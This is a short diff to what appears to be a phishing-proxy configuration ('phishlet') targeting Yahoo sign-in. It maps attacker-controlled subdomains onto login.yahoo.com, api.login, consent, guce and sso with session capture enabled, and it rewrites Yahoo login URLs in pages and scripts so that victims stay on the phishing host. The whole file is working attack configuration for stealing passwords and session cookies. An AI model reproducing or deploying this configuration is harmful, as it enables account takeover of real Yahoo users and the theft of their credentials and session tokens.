@@ -1,11 +1,11 @@
 name: 'yahoo'
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: '{{.Endpoint1}}', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'guce.{{.Endpoint1}}', orig_sub: 'guce', domain: 'yahoo.com', session: true, auto_filter: true}
-  - {phish_sub: 'api.{{.Endpoint1}}', orig_sub: 'api.login', domain: 'yahoo.com', session: true, auto_filter: true}
-  - {phish_sub: 'consent.{{.Endpoint1}}', orig_sub: 'consent', domain: 'yahoo.com', session: true, auto_filter: true}
-  - {phish_sub: 'sso.{{.Endpoint1}}', orig_sub: 'sso', domain: 'yahoo.com', session: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: true, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api.login', domain: 'yahoo.com', session: true, auto_filter: true}
+  - {phish_sub: 'consent', orig_sub: 'consent', domain: 'yahoo.com', session: true, auto_filter: true}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'yahoo.com', session: true, auto_filter: true}
 sub_filters:
   # Replace login.yahoo.com references (HTTP/HTTPS, triggered from any Yahoo subdomain)
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
